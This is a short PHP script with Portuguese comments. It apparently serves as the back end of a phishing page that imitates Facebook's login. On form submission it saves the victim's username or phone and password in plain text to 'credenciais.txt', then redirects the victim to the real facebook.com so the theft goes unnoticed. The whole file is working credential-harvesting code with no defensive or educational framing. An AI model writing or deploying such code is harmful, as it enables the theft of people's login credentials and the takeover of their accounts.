<?php
// Verifica se o método de requisição é POST (significa que o formulário foi enviado)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtém os dados enviados pelo formulário
    $username = $_POST['username'];  // Captura o nome de usuário (e-mail ou telefone)
    $password = $_POST['password'];  // Captura a senha

    // Salva os dados capturados em um arquivo chamado "credenciais.txt"
    $file = fopen("credenciais.txt", "a");  // Abre o arquivo para adicionar novos dados
    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n"); // Escreve no arquivo
    fclose($file);  // Fecha o arquivo

    // Redireciona o usuário para o Facebook (simulando o login)
    header("Location: https://www.facebook.com");
    exit(); // Interrompe o script após o redirecionamento
}
?>
